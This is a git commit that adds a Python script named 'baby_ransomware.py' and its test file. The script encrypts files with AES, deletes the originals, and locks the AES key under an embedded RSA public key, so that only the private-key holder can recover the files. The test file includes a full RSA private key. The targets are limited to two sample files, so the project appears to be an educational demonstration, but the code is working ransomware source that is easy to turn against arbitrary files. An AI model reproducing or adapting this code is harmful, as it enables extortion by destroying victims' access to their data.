3831480cce361feba0c7e91ffc1c60282f414f0e
Phatcha <96409589+Bow123580@users.noreply.github.com>
2022-02-12 16:57:20 +0700

    Add files via upload

---
+++ baby_ransomware.py
@@ -0,0 +1,156 @@
+from Crypto.Cipher import AES
+from Crypto.Cipher import PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from base64 import b64encode, b64decode
+import os
+
+
+def pad(data_bytes):
+    width = AES.block_size - len(data_bytes) % AES.block_size
+    return data_bytes + bytes([width] * width)
+
+
+def unpad(data_bytes):
+    last_index = len(data_bytes) - 1
+    last_byte = data_bytes[last_index]
+    width = last_byte
+    return data_bytes[:-width]
+
+
+def aes_encrypt(key, iv, plain_bytes):
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    padded_plain_bytes = pad(plain_bytes)
+    return aes.encrypt(padded_plain_bytes)
+
+
+def aes_decrypt(key, iv, cipher_bytes):
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    padded_plain_bytes = aes.decrypt(cipher_bytes)
+    return unpad(padded_plain_bytes)
+
+
+def aes_encrypt_file(key, iv, src_filename, dst_filename):
+    with open(src_filename, 'rb') as fo:
+        plain_bytes = fo.read()
+    cipher_bytes = aes_encrypt(key, iv, plain_bytes)
+    with open(dst_filename, 'wb') as fo:
+        fo.write(cipher_bytes)
+
+
+def aes_decrypt_file(key, iv, src_filename, dst_filename):
+    with open(src_filename, 'rb') as fo:
+        cipher_bytes = fo.read()
+    plain_bytes = aes_decrypt(key, iv, cipher_bytes)
+    with open(dst_filename, 'wb') as fo:
+        fo.write(plain_bytes)
+
+
+def base64_encode_bytes_to_str(data_bytes):
+    base64_bytes = b64encode(data_bytes)
+    base64_ascii_str = base64_bytes.decode('ascii')
+    return base64_ascii_str
+
+
+def base64_decode_str_to_bytes(base64_ascii_str):
+    base64_bytes = base64_ascii_str.encode('ascii')
+    data_bytes = b64decode(base64_bytes)
+    return data_bytes
+
+
+def save_local_key(aes_key, aes_iv, rsa_key, local_key_filename):
+    pkcs1 = PKCS1_OAEP.new(rsa_key)
+    aes_key_base64_str = base64_encode_bytes_to_str(aes_key)
+    aes_iv_base64_str = base64_encode_bytes_to_str(aes_iv)
+    local_key_base64_str = aes_key_base64_str + '\n' + aes_iv_base64_str
+    local_key_base64_bytes = local_key_base64_str.encode('utf8')
+    cipher_bytes = pkcs1.encrypt(local_key_base64_bytes)
+    with open(local_key_filename, 'wb') as fo:
+        fo.write(cipher_bytes)
+
+
+def load_local_key(rsa_key, local_key_filename):
+    pkcs1 = PKCS1_OAEP.new(rsa_key)
+    with open(local_key_filename, 'rb') as fo:
+        cipher_bytes = fo.read()
+    local_key_base64_bytes = pkcs1.decrypt(cipher_bytes)
+    local_key_base64_str = local_key_base64_bytes.decode('utf8')
+    aes_key_base64_str, aes_iv_base64_str = local_key_base64_str.split('\n')
+    aes_key = base64_decode_str_to_bytes(aes_key_base64_str)
+    aes_iv = base64_decode_str_to_bytes(aes_iv_base64_str)
+    return aes_key, aes_iv
+
+
+rsa_public_key_str = '''
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyIge8UVqxEy9FAzShyGP
+WKoVcu6BlNVMyleceHc4+fwZG4cn9UxhPDwJ+LGCrCeRh8Qd7Pirlit66ZOTDTC8
+8H7vbiwFpmJ3clonRA4BDQ/YSBtxJIPLJiMAZ5N7NIG25AyaBATznhLviWRZyfi0
+ZSAsFbzNUm67ljb7jw4YDmv2UNx1tLt4VqpBNKTjANu1RrB9uPhQZhrXdkbxBPlj
+AaP4E/XATdsgSru/o+ZUE9ABEwo4w18nc+G3rvePVrxFVoV2ISsaeJZnEpzBhsef
+sDmedsvh+rnNZXH8NS1a0TyXpMHObzb5v3FwA4vYvO0M+LsQ8bxpSw50GCt3ZYtV
+JwIDAQAB
+-----END PUBLIC KEY-----
+'''
+rsa_public_key = RSA.import_key(rsa_public_key_str.strip())
+default_local_key_filename = 'LocalKey'
+
+
+def run_encryption_mode():
+    aes_key = get_random_bytes(32)
+    aes_iv = get_random_bytes(AES.block_size)
+    print('AES Key:', aes_key)
+    src_filenames = ['sample.jpg', 'sample.txt']
+    for src_filename in src_filenames:
+        if os.path.exists(src_filename):
+            dst_filename = src_filename + '.enc'
+            aes_encrypt_file(aes_key, aes_iv, src_filename, dst_filename)
+            print(f'The content of file {src_filename} has been encrypted into file {dst_filename}.')
+            os.remove(src_filename)
+            print(f'File {src_filename} has been removed.')
+        else:
+            print(f'File {src_filename} does not exist.')
+    save_local_key(aes_key, aes_iv, rsa_public_key, default_local_key_filename)
+    print(f'AES Key and IV have been saved into file {default_local_key_filename}.')
+
+
+def run_decryption_mode():
+    print('Paste RSA Private Key and Press Enter:')
+    rsa_private_key = input_rsa_private_key()
+    aes_key, aes_iv = load_local_key(rsa_private_key, default_local_key_filename)
+    print('AES Key:', aes_key)
+    src_filenames = ['sample.jpg.enc', 'sample.txt.enc']
+    for src_filename in src_filenames:
+        if os.path.exists(src_filename):
+            dst_filename = src_filename.rstrip('.enc')
+            aes_decrypt_file(aes_key, aes_iv, src_filename, dst_filename)
+            print(f'The content of file {src_filename} has been decrypted into file {dst_filename}.')
+            os.remove(src_filename)
+            print(f'File {src_filename} has been removed.')
+        else:
+            print(f'File {src_filename} does not exist.')
+
+
+def input_rsa_private_key():
+    rsa_private_key_str = ''
+    while True:
+        line = input()
+        rsa_private_key_str += line + '\n'
+        if line == '-----END RSA PRIVATE KEY-----':
+            break
+    return RSA.import_key(rsa_private_key_str.strip())
+
+
+def main():
+    print('Operation Modes')
+    print('    1. Encryption Mode')
+    print('    2. Decryption Mode')
+    mode = int(input('Select an Operation Mode (Enter 1 or 2): '))
+    if mode == 1:
+        run_encryption_mode()
+    elif mode == 2:
+        run_decryption_mode()
+
+
+if __name__ == '__main__':
+    main()
---
+++ baby_ransomware_test.py
@@ -0,0 +1,73 @@
+from baby_ransomware import *
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+import filecmp
+
+aes_key = get_random_bytes(32)
+aes_iv = get_random_bytes(AES.block_size)
+rsa_private_key_str = '''
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAyIge8UVqxEy9FAzShyGPWKoVcu6BlNVMyleceHc4+fwZG4cn
+9UxhPDwJ+LGCrCeRh8Qd7Pirlit66ZOTDTC88H7vbiwFpmJ3clonRA4BDQ/YSBtx
+JIPLJiMAZ5N7NIG25AyaBATznhLviWRZyfi0ZSAsFbzNUm67ljb7jw4YDmv2UNx1
+tLt4VqpBNKTjANu1RrB9uPhQZhrXdkbxBPljAaP4E/XATdsgSru/o+ZUE9ABEwo4
+w18nc+G3rvePVrxFVoV2ISsaeJZnEpzBhsefsDmedsvh+rnNZXH8NS1a0TyXpMHO
+bzb5v3FwA4vYvO0M+LsQ8bxpSw50GCt3ZYtVJwIDAQABAoIBAAW7q97L/u8ZHo1p
+3G7+l6GPo0iuPEgsB6Oqo4+SIQU3SY8kQGaJRie5s7NHfUE8vwgO+agNEqLFdXXO
+FqCEPzKaU8VmPsxwo5JCX5MDhNDXHiDZn/93lnbtqJT4KMfp2Xe69dWdlUrJ/Hfa
+GvMPnYtdQxq6qMgYNbFoEFhuV7kPHNOv9QE1NP7d4gZgLzmHTGi65iklSaJCva7v
+TWq7mQ2mQvLGTT9ZiztKHdIPnMMApEkOypFdzIfiNy5r4EJf5BI8JdB9nL9NhisD
+FWF521HrQ0eTgBvzx3bnRVjYle3+Y3z466EbIQh5lGwZkgB0sGcNiiht2PRdE1NE
++2UR8uECgYEA3yj8Bg1wKdDsjMfVbbFi/6WuEBqz+H8NBYOESXqLv1whRp2UrrGY
+5LwDv+kQozFwQWIjLnt0UpOKRwcTaB4BSxRdjXhr8IvyirVcTA1Eoc9OMaZf8JF8
+0O9h6eXPvQ/CCpKEWxq5EW+HJeVOvvNOgNSfPZD/LPfjKKG6VOf/lzECgYEA5gqq
+0/aaHV70Xy2FmIJc+2XObrSFoygVnZ4Y0fuCwU6dtb0S9WvIjVSxvpQQSLu+WU4E
+YDMwwT6yYa0TSe/ixGin4RpRyAR3wYLtbMpdTz/6+UrTu+09ENzMrbA+81gMLcpc
+s8U+uDoPyS7FoFHKhCkgWerq3QTgMMXIQoAYS9cCgYEA1dSCsRX9TMQ5daghtQsN
+DmNmB15e5pRvGMJtZq766zDPXceu6TmZhEs32JLtc0HzC2OKzIZU7q8bB3YbPV/K
+43MvNViXLRYcIJcpSmJISjfG+EIwmeX+UIGgM6wWQ1WvG8xK8LUJclCIkmJH8yZW
+KZISx76BFEiurIdTcPogaXECgYBitScR5pnAipL/GBBgHWf6c3e9pvZEyRllVYY+
+69XyTmJ7rhKpfkNC6ZmPNgc6vlxyA3j7Mlv0P4vZP6OsMSOztVh7zYhT9B7SyPRJ
+nxekvsZZG9N4qtZuGuA0kxCf6CLprxBSDwvXjwphABHKte3ZAbChBJ0ck1ADfYpt
+hntmZwKBgQCUIIG952KJnn3AYed7DgIcHi8wmZBD5wacmoWWA9SmjWZrEBAA6onm
+ua95gl6r4IEeQ/b3V+wgGRh3PI97NllXI5DdBAzvJSG4TdqCtxRDN1hR7zpO8mlF
+XKECMagNBMSjvDYPVobRhZVMBYhjKDuAk0z4WH7yIdLoV7/zLYAFpA==
+-----END RSA PRIVATE KEY-----
+'''
+rsa_public_key_str = '''
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyIge8UVqxEy9FAzShyGP
+WKoVcu6BlNVMyleceHc4+fwZG4cn9UxhPDwJ+LGCrCeRh8Qd7Pirlit66ZOTDTC8
+8H7vbiwFpmJ3clonRA4BDQ/YSBtxJIPLJiMAZ5N7NIG25AyaBATznhLviWRZyfi0
+ZSAsFbzNUm67ljb7jw4YDmv2UNx1tLt4VqpBNKTjANu1RrB9uPhQZhrXdkbxBPlj
+AaP4E/XATdsgSru/o+ZUE9ABEwo4w18nc+G3rvePVrxFVoV2ISsaeJZnEpzBhsef
+sDmedsvh+rnNZXH8NS1a0TyXpMHObzb5v3FwA4vYvO0M+LsQ8bxpSw50GCt3ZYtV
+JwIDAQAB
+-----END PUBLIC KEY-----
+'''
+rsa_public_key = RSA.import_key(rsa_public_key_str.strip())
+rsa_private_key = RSA.import_key(rsa_private_key_str.strip())
+
+p1 = pad('abc'.encode('utf8'))
+assert len(p1) == AES.block_size
+
+u1 = unpad(p1)
+assert u1 == 'abc'.encode('utf8')
+
+p2 = pad('abc'.encode('utf8'))
+c1 = aes_encrypt(aes_key, aes_iv, p2)
+p3 = aes_decrypt(aes_key, aes_iv, c1)
+assert unpad(p3) == 'abc'.encode('utf8')
+
+aes_encrypt_file(aes_key, aes_iv, 'sample.jpg', 'sample.jpg.enc')
+aes_decrypt_file(aes_key, aes_iv, 'sample.jpg.enc', 'sample1.jpg')
+assert filecmp.cmp('sample.jpg', 'sample1.jpg')
+
+aes_encrypt_file(aes_key, aes_iv, 'sample.txt', 'sample.txt.enc')
+aes_decrypt_file(aes_key, aes_iv, 'sample.txt.enc', 'sample1.txt')
+assert filecmp.cmp('sample.txt', 'sample1.txt')
+
+save_local_key(aes_key, aes_iv, rsa_public_key, 'LocalKey')
+loaded_aes_key, loaded_aes_iv = load_local_key(rsa_private_key, 'LocalKey')
+assert loaded_aes_key == aes_key
+assert loaded_aes_iv == aes_iv
